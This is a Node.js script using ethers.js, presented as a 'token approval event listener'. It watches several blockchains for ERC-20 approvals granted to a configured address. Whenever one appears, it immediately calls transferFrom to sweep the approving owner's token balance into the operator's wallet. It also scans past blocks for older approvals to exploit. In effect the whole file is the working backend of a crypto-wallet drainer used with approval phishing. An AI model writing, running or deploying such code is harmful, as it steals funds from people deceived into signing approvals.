require('dotenv').config();
const { ethers } = require('ethers');

console.log("🔧 Loading environment variables...");
console.log(`📋 INFURA_URL: ${process.env.INFURA_URL ? 'Set' : 'Not set'}`);
console.log(`📋 PRIVATE_KEY: ${process.env.PRIVATE_KEY ? 'Set' : 'Not set'}`);
console.log(`📋 RECIPIENT_ADDRESS: ${process.env.RECIPIENT_ADDRESS ? 'Set' : 'Not set'}`);

const provider = new ethers.JsonRpcProvider(process.env.INFURA_URL);
let wallet;

if (process.env.MNEMONIC) {
  wallet = ethers.Wallet.fromPhrase(process.env.MNEMONIC, provider);
  console.log("👛 Using wallet from mnemonic:", wallet.address);
} else if (process.env.PRIVATE_KEY) {
  wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  console.log("👛 Using wallet from private key:", wallet.address);
} else {
  throw new Error("❌ No MNEMONIC or PRIVATE_KEY found in .env file");
}

// Cache to track processed approvals
const processedApprovals = new Set();

// ERC-20 ABI
const erc20Abi = [
  "function transferFrom(address from, address to, uint amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "event Approval(address indexed owner, address indexed spender, uint value)"
];

// Token addresses on different networks
const TOKEN_ADDRESSES = {
  1: { // Mainnet
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
    UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    STETH: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84'
  },
  5: { // Goerli
    USDT: '0xC2C527C0CACF457746Bd31B2a698Fe89de2b6d49',
    USDC: '0x07865c6E87B9F70255377e024ace6630C1Eaa37F',
    WETH: '0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6'
  },
  11155111: { // Sepolia
    USDT: '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0',
    USDC: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    WETH: '0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14'
  },
  42161: { // Arbitrum
    USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
    WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
    WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
    LINK: '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4'
  },
  10: { // Optimism
    USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
    USDC: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',
    WETH: '0x4200000000000000000000000000000000000006',
    WBTC: '0x68f180fcCe6836688e9084f035309E29Bf0A2095',
    LINK: '0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6'
  },
  137: { // Polygon
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
    WBTC: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6',
    LINK: '0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39',
    SHIB: '0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec',
    UNI: '0xb33EaAd8d922B1083446DC23f610c2567fB5180f'
  },
  8453: { // Base
    USDT: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb',
    USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
    WETH: '0x4200000000000000000000000000000000000006',
    WBTC: '0x3cABa682bC7c370a6E61b4570c7D7A1147d95c8d'
  },
  56: { // BNB Smart Chain
    USDT: '0x55d398326f99059fF775485246999027B3197955',
    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    WETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
    WBTC: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
    LINK: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
    SHIB: '0x2859e4544C4bB03966803b044A93563Bd2D0DD4D',
    UNI: '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1'
  }
};

// Get token symbol from address
async function getTokenSymbol(tokenAddress) {
  try {
    const network = await provider.getNetwork();
    const chainId = network.chainId;
    
    const networkTokens = TOKEN_ADDRESSES[chainId];
    if (!networkTokens) return 'UNKNOWN';
    
    const entry = Object.entries(networkTokens).find(
      ([, addr]) => addr.toLowerCase() === tokenAddress.toLowerCase()
    );
    
    return entry ? entry[0] : 'UNKNOWN';
  } catch (error) {
    console.error("Error getting token symbol:", error);
    return 'UNKNOWN';
  }
}

// Verify if a token address is one of our target tokens
async function isTargetToken(tokenAddress) {
  try {
    const network = await provider.getNetwork();
    const chainId = network.chainId;
    
    const networkTokens = TOKEN_ADDRESSES[chainId];
    if (!networkTokens) return false;
    
    return Object.values(networkTokens).some(
      addr => addr.toLowerCase() === tokenAddress.toLowerCase()
    );
  } catch (error) {
    console.error("Error verifying token address:", error);
    return false;
  }
}

async function handleApprovalEvent(log, isHistorical = false) {
  try {
    const eventId = `${log.transactionHash}-${log.logIndex}`;
    
    if (processedApprovals.has(eventId)) {
      return;
    }
    
    processedApprovals.add(eventId);

    const iface = new ethers.Interface(erc20Abi);
    const event = iface.parseLog(log);

    const owner = event.args.owner;
    const spender = event.args.spender;
    const amount = event.args.value;

    if (spender.toLowerCase() !== process.env.RECIPIENT_ADDRESS.toLowerCase()) {
      return;
    }

    const tokenSymbol = await getTokenSymbol(log.address);
    
    console.log(`${isHistorical ? 'Historical' : 'New'} ${tokenSymbol} Approval: ${owner} approved ${spender} for ${amount}`);

    const isUnlimited = amount === ethers.MaxUint256;
    
    if (isUnlimited) {
      console.log(`✅ Unlimited approval detected for ${tokenSymbol}`);
      await attemptTokenTransfer(log.address, owner, tokenSymbol);
      return;
    }

    const tokenContract = new ethers.Contract(log.address, erc20Abi, wallet);
    
    try {
      const balance = await tokenContract.balanceOf(owner);
      console.log(`${tokenSymbol} balance for ${owner}: ${ethers.formatUnits(balance, await getDecimals(tokenContract))}`);
      
      if (balance > 0n) {
        await attemptTokenTransfer(log.address, owner, tokenSymbol, balance);
      } else {
        console.log("No balance to transfer.");
      }
    } catch (error) {
      console.error(`Error checking balance for ${tokenSymbol}:`, error.message);
    }
    
  } catch (error) {
    console.error("Error handling approval event:", error);
  }
}

async function attemptTokenTransfer(tokenAddress, owner, tokenSymbol, specificAmount = null) {
  try {
    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, wallet);
    const decimals = await getDecimals(tokenContract);
    
    const amountToTransfer = specificAmount || await tokenContract.balanceOf(owner);
    
    if (amountToTransfer === 0n) {
      console.log(`No ${tokenSymbol} balance to transfer from ${owner}`);
      return;
    }

    console.log(`🚀 Attempting to transfer ${ethers.formatUnits(amountToTransfer, decimals)} ${tokenSymbol} from ${owner}...`);
    
    const tx = await tokenContract.transferFrom(owner, wallet.address, amountToTransfer, {
      gasLimit: 100000
    });
    
    console.log("📤 TransferFrom transaction sent:", tx.hash);

    const receipt = await tx.wait();
    console.log(`✅ TransferFrom confirmed in block ${receipt.blockNumber}`);
    console.log(`⛽ Gas used: ${receipt.gasUsed.toString()}`);
    
  } catch (error) {
    console.error(`❌ Error transferring ${tokenSymbol}:`, error.message);
    
    if (error.message.includes('insufficient allowance')) {
      console.log('Insufficient allowance for transfer');
    } else if (error.message.includes('execution reverted')) {
      console.log('Transaction reverted - possibly revoked approval');
    }
  }
}

async function getDecimals(tokenContract) {
  try {
    return await tokenContract.decimals();
  } catch {
    return 18;
  }
}

// Rate limiting
let lastRequestTime = 0;
const REQUEST_DELAY = 200;

async function rateLimitedRequest(callback) {
  const now = Date.now();
  const timeSinceLastRequest = now - lastRequestTime;
  
  if (timeSinceLastRequest < REQUEST_DELAY) {
    await new Promise(resolve => setTimeout(resolve, REQUEST_DELAY - timeSinceLastRequest));
  }
  
  lastRequestTime = Date.now();
  return callback();
}

async function scanHistoricalApprovals() {
  console.log("🔍 Scanning for historical approval events...");
  
  try {
    const currentBlock = await provider.getBlockNumber();
    const blocksToScan = process.env.BLOCKS_TO_SCAN ? parseInt(process.env.BLOCKS_TO_SCAN) : 1000;
    const fromBlock = currentBlock - blocksToScan;
    
    console.log(`📊 Scanning blocks from ${fromBlock} to ${currentBlock}`);
    
    const filter = {
      topics: [
        ethers.id("Approval(address,address,uint256)"),
        null,
        ethers.zeroPadValue(process.env.RECIPIENT_ADDRESS, 32)
      ],
      fromBlock: fromBlock,
      toBlock: currentBlock
    };
    
    const logs = await rateLimitedRequest(() => provider.getLogs(filter));
    console.log(`📋 Found ${logs.length} historical approval events`);
    
    for (let i = 0; i < logs.length; i++) {
      if (i % 10 === 0 && i > 0) {
        console.log(`🔄 Processed ${i}/${logs.length} events...`);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      await handleApprovalEvent(logs[i], true);
    }
    
    console.log("✅ Historical scan completed.");
  } catch (error) {
    console.error("❌ Error scanning historical approvals:", error);
  }
}

// Main function
async function main() {
  console.log("🚀 Starting token approval event listener...");
  
  try {
    const network = await provider.getNetwork();
    const chainId = network.chainId;
    const networkTokens = TOKEN_ADDRESSES[chainId];
    
    if (!networkTokens) {
      throw new Error(`No tokens configured for chain ID ${chainId}`);
    }
    
    console.log(`🌐 Connected to ${network.name} (ID: ${chainId})`);
    console.log(`✅ Supported tokens: ${Object.keys(networkTokens).join(', ')}`);
    console.log(`🎯 Recipient address: ${process.env.RECIPIENT_ADDRESS}`);
    console.log(`👛 Wallet address: ${wallet.address}`);

    // Scan historical approvals
    await scanHistoricalApprovals();

    // Set up listener for new approvals
    const filter = {
      topics: [
        ethers.id("Approval(address,address,uint256)"),
        null,
        ethers.zeroPadValue(process.env.RECIPIENT_ADDRESS, 32)
      ]
    };

    provider.on(filter, (log) => {
      console.log("🎯 New approval event detected!");
      handleApprovalEvent(log, false);
    });

    console.log("👂 Listening for new token approval events...");
    console.log("Press Ctrl+C to stop the listener");

  } catch (error) {
    console.error("💥 Fatal error:", error.message);
    process.exit(1);
  }
}

// Handle graceful shutdown
process.on("SIGINT", () => {
  console.log("🛑 Shutting down listener...");
  provider.removeAllListeners();
  process.exit(0);
});

// Start the application
main().catch(console.error);